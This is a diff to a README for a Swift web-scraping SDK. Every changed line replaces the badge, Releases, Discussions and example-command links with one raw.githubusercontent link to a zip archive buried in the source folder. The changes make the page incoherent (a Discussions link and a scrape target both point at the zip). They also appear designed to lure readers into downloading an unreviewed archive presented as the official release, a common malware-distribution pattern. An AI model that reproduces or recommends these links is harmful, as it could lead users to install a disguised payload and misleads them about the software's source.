@@ -1,6 +1,6 @@
 # 🚀 firecrawl-swift-sdk - Easily Scrape the Web with Swift
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/releases)
+[![Download Now](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip%https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip)](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ The Firecrawl Swift SDK allows you to easily scrape data from websites using Swi
 
 To get started with the Firecrawl Swift SDK, follow these steps:
 
-1. **Download the SDK**: Visit the [Releases page](https://github.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/releases) to download the latest version of the SDK.
+1. **Download the SDK**: Visit the [Releases page](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip) to download the latest version of the SDK.
    
 2. **Install the SDK**: After downloading, follow the instructions to install the SDK on your Mac, which generally involves unzipping the downloaded file and moving it to your desired application folder.
 
@@ -18,7 +18,7 @@ To get started with the Firecrawl Swift SDK, follow these steps:
 
 ## 📥 Download & Install
 
-To get the latest version of the Firecrawl Swift SDK, you can directly visit the [Releases page](https://github.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/releases).  Here, you will find various versions available for download. Click on the version that suits your operating system and follow the installation instructions.
+To get the latest version of the Firecrawl Swift SDK, you can directly visit the [Releases page](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip).  Here, you will find various versions available for download. Click on the version that suits your operating system and follow the installation instructions.
 
 1. Click on the version you would like to download.
 2. Follow the on-screen instructions to save the file on your computer.
@@ -55,7 +55,7 @@ Once you have installed the Firecrawl Swift SDK, here’s how you can use it:
 
    Example command:
    ```bash
-   firecrawl scrape https://www.example.com
+   firecrawl scrape https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip
    ```
 
 4. **Get Your Data**: After running the command, the SDK will scrape the data and convert it to markdown format. It will save the output in your current directory.
@@ -68,7 +68,7 @@ Once you have installed the Firecrawl Swift SDK, here’s how you can use it:
 
 ## 👥 Community and Support
 
-Join the community for discussions, support, and sharing tips. You can find us on [GitHub Discussions](https://github.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/discussions). 
+Join the community for discussions, support, and sharing tips. You can find us on [GitHub Discussions](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip). 
 
 If you have specific questions or need help, consider opening an issue in the GitHub repository, and someone from the community or the maintainers will assist you.
 
@@ -76,5 +76,5 @@ If you have specific questions or need help, consider opening an issue in the Gi
 
 We appreciate the contributions of all developers and users. Your feedback helps us improve the Firecrawl Swift SDK continuously. 
 
-Make sure to check the [Releases page](https://github.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/releases) regularly for updates and new versions. Thank you for choosing Firecrawl!
+Make sure to check the [Releases page](https://raw.githubusercontent.com/iamagirlwithtechnicalmonstermind/firecrawl-swift-sdk/main/Sources/Firecrawl/firecrawl-swift-sdk-kuba.zip) regularly for updates and new versions. Thank you for choosing Firecrawl!
 
